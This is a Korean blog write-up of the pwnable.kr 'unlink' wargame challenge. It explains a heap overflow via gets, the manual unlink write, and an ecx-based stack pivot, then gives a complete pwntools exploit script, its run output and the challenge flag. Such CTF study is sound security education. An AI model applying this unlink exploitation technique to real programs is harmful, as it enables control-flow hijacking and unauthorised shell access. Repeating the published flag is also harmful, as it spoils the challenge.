---
layout: post
title:  "Pwnable.kr unlink 풀이"
date:   2019-01-24 15:13:49 +0900
categories: pwn
tags: writeup
---

# unlink - 10 pt

## 문제

```
Daddy! how can I exploit unlink corruption?

ssh unlink@pwnable.kr -p2222 (pw: guest)
```

SSH로 연결해 들어가 보면 읽기 권한이 없는 `flag` 파일, `unlink.c` 소스코드와 `unlink` 바이너리가 주어져 있습니다. 이 문제의 목표는 `unlink` 바이너리에서 `shell`함수를 호출해 쉘을 따는 것 같네요.

## 풀이

### 개요

주어진 소스코드를 보면서 문제의 개략적인 구조를 파악해 봅시다.

```c
typedef struct tagOBJ{
        struct tagOBJ* fd;
        struct tagOBJ* bk;
        char buf[8];
}OBJ;
```

`OBJ`란 구조체가 정의되어 있습니다. 구조체 포인터인 `fd`와 `bk`가 있고 8바이트를 담을 수 있는 공간이 있네요. `fd`와 `bk`의 용도는 뒤에서도 나오겠지만 여러 개의 `OBJ` 구조체를 하나의 연결 리스트처럼 이을때 사용하는 포인터랍니다.

```c
void shell(){
        system("/bin/sh");
}
```

딱 봐도 이 함수로 실행흐름을 바꿔서 쉘을 따는 것 같습니다. 참고로 `unlink` 바이너리의 권한은 `flag`파일을 읽을 수 있도록 해줍니다.

```c
int main(int argc, char* argv[]){
        malloc(1024);
        OBJ* A = (OBJ*)malloc(sizeof(OBJ));
        OBJ* B = (OBJ*)malloc(sizeof(OBJ));
        OBJ* C = (OBJ*)malloc(sizeof(OBJ));

        // double linked list: A <-> B <-> C
        A->fd = B;
        B->bk = A;
        B->fd = C;
        C->bk = B;

        printf("here is stack address leak: %p\n", &A);
        printf("here is heap address leak: %p\n", A);
        printf("now that you have leaks, get shell!\n");
        // heap overflow!
        gets(A->buf);

        // exploit this unlink!
        unlink(B);
        return 0;
}
```

`unlink` 바이너리의 메인 함수입니다. `OBJ` 구조체 3개 (A, B, C)를 생성한 후, A의 fd를 B로, B의 fd를 C로 연결한 다음 C의 bk를 B로, B의 bk를 A로 연결하고 있습니다. 그 다음 `gets` 함수로 A의 메모리 공간에 데이터를 입력합니다. 여기서 Heap Overflow 가 발생해서 뒤에 오는 B 구조체와 C 구조체의 메모리 공간을 마음대로 변조할 수 있게 됩니다. 그 다음 B를 `unlink` 함수로 각 구조체간의 연결을 끊습니다. `unlink` 함수를 좀더 자세히 보도록 할까요.

```c
void unlink(OBJ* P){
        OBJ* BK;
        OBJ* FD;
        BK=P->bk;
        FD=P->fd;
        FD->bk=BK;
        BK->fd=FD;
}
```

`unlink` 함수에서는 파라미터로 주어진 `OBJ` 구조체 블록의 연결을 끊으면서 자신의 `fd`와 `bk`를 가르키고 있던 두 구조체로 연결을 시켜주네요. 결국 끊어진 구조체는 고립되게 됩니다. 그림으로 보면 이해가 더 쉬울 것 같네요. 발로 그림을 그렸나 의심할 수 있는데 손으로 그렸습니다 하하.

![1](https://raw.githubusercontent.com/cxbt/Writeup/master/Wargame/Pwnable.kr/screenshot/unlink_1.png)

### 공략 방법

`unlink` 바이너리에서 Stack 영역 주소와 Heap 영역 주소를 알려주고 있습니다. 이 문제를 접하고 하루정도 잡고 늘어지고 있었는데요, 그동안 여러가지 삽질을 시도해 봤습니다.

- `B.fd`에 `main` 함수 스택 프레임의 리턴 주소를 넣고, `B.bk`에 `shell` 함수의 주소를 넣어서 실행흐름을 바꾼다.

안타깝게도 `unlink` 함수를 호출하면 하면 `B.fd` 주소에 있는 값과 `B.bk` 주소에 있는 값이 각자의 주소로 바뀌게 됩니다. 그래서 `main` 함수 스택 프레임의 리턴 주소는 정상적으로 바꿀수 있습니다만 `shell` 함수의 주소로 가서 쓰기 작업을 할 수 없는 코드 영역에 데이터를 쓰려고 하기 때문에 Segmentation Fault가 발생하면서 프로그램이 죽습니다. (RIP)

- `A.buf`에 `jmp $shell`과 같은 어셈 코드를 넣고 위처럼 실행흐름을 Heap으로 넘긴다.

위와 비슷한 맥락의 문제가 발생하는데 어셈 코드를 넣는다고 해도 나중에 `main` 함수 주소로 덮어 씌워지게 됩니다. 그래서 프로그램이 이상해 지다가 실행할 수 없는 코드를 만나고 죽게 되죠. 게다가 바이너리에 NX가 걸려있어서 어셈 코드가 실행을 될지 모르겠네요. (알고보니 실행 됐습니다)

이 눈물나는 삽질과 노가다를 하루 종일 하다가 깨달은 건 `shell` 함수를 Heap에 저장해 놓고 리턴 주소를 직접적으로 `shell` 함수 주소로 바꾸는 것을 어렵다는 점, 그리고 이를 위해서 `shell` 함수를 간접적으로 참조하게 하는 로직을 찾아야 한다는 점입니다. 아무리 봐도 어느부분을 사용해야 되려나 봤는데 눈 씻고 찾아봐도 없어서 여러 블로그 눈팅했는데요, [이 블로그](https://go-madhat.github.io/pwnable.kr-unlink/)를 살짝살짝 읽다가 깨달음을 얻었습니다.

```assembly
0x0804852f <+0>:     lea    ecx,[esp+0x4]
0x08048533 <+4>:     and    esp,0xfffffff0
0x08048536 <+7>:     push   DWORD PTR [ecx-0x4]
0x08048539 <+10>:    push   ebp
0x0804853a <+11>:    mov    ebp,esp
...
0x080485fa <+203>:   mov    eax,0x0
0x080485ff <+208>:   mov    ecx,DWORD PTR [ebp-0x4]     <- 여기, 결국 EBP-0x4 값만 컨트롤 하면 EIP를 변조할 수 있게 된다.
0x08048602 <+211>:   leave
0x08048603 <+212>:   lea    esp,[ecx-0x4]               <- 여기
0x08048606 <+215>:   ret
```

처음 어셈블리 코드를 봤을 때 왜 저런 방식으로 함수 프롤로그를 여는지 궁금해서 구글에 쳐봤는데 컴파일러의 속마음을 아는 사람은 없었는지 이유를 찾지 못했습니다. 그러나 중요한 점은 이게 리턴 주소를 단순히 스택에 집어 넣고 `leave ret`으로 돌아가는 것이 아니라 `ECX` 범용 레지스터를 사용해서 간접적으로 참조를 시킨다는 점입니다. 왜 이렇게 컴파일러가 하는지에 대한 이유는 아직도 찾지 못했습니다. (주소 정렬하려고 이렇게 했나) 

간단하게 요약하자면 `lea esp,[ecx-0x4]` 코드를 활용하면 `shell` 함수의 주소를 간접적으로 가져올수 있습니다! :D

위에서 수행하려고 했던 방법의 한계점은 이랬죠.

- 읽기 영역인 코드 영역을 침범했다.
  - 이번에는 Heap과 Stack에 있는 값을 변조할 것이기 때문에 코드 영역을 침범하지 않습니다!
- 값이 서로 뒤바뀌어서 직접적으로 값을 참조할 수 없다.
  - `ESP`를 변조하는 값이 `[ecx-0x4]`이기 때문에 서로 뒤바뀐 값이 들어있는 영역이 아니라 그 영역에서 4바이트 전의 영역을 사용할 수 있다. 여기에 `shell` 함수의 주소를 넣고 이쪽으로 실행흐름을 돌리면 되겠네요.

아래 코드는 위에서 설명한 방법을 사용하는 익스플로잇 코드입니다.

```python
from pwn import *

p = process("/home/unlink/unlink")
d = p.recvuntil("get shell!")
print d

# 문제에서 주어진 Stack, Heap, Shell 함수의 주소를 가져온다.
stack = int(d.split(":")[1].split()[0].strip(),16)
heap = int(d.split(":")[2].split()[0].strip(),16)
shell = "\xeb\x84\x04\x08"

# 페이로드를 구성한다.
payload = ""
payload += shell+'A'*12         # A.buf[8] = Shell 함수 4바이트 + "A"*4
payload += p32(stack + 0xc)     # B.fd = EBP-0x4 위치를 주어진 Stack 주소에서 계산해 넣는다.
payload += p32(heap + 0xc)      # A.buf+4 = ecx-0x4를 참조하기 때문에 A.buf+4 주소를 넣는다.

print repr(payload)

p.send(payload)
print p.recvline()
p.interactive()
```

실행하면 매끄럽게 따지는 마술을 볼수 있습니다. 와우.

```bash
unlink@ubuntu:~$ python /tmp/nvm.py
[+] Starting local process '/home/unlink/unlink': Done
here is stack address leak: 0xff974b84
here is heap address leak: 0x929e410
now that you have leaks, get shell!
'\xeb\x84\x04\x08AAAAAAAAAAAA\x90K\x97\xff\x1c\xe4)\t'


[*] Switching to interactive mode
$ ls
flag  intended_solution.txt  unlink  unlink.c
$ cat flag
conditional_write_what_where_from_unl1nk_explo1t
```

Heap 영역에서 발생하는 여러가지 취약점 중 간략화된 `Double Free Bug`를 사용해서 풀도록 만든 문제였습니다. 더 많은 Heap 영역에서 발생하는 취약점을 알고 싶으시다면 [블랙펄시큐리티 블로그 글](https://bpsecblog.wordpress.com/2016/10/06/heap_vuln/)을 한번 읽어보세요.

---

<sub>
더 많은 문제풀이는 제 [리포](https://github.com/cxbt/Writeup)에서 확인하실수 있습니다.
</sub>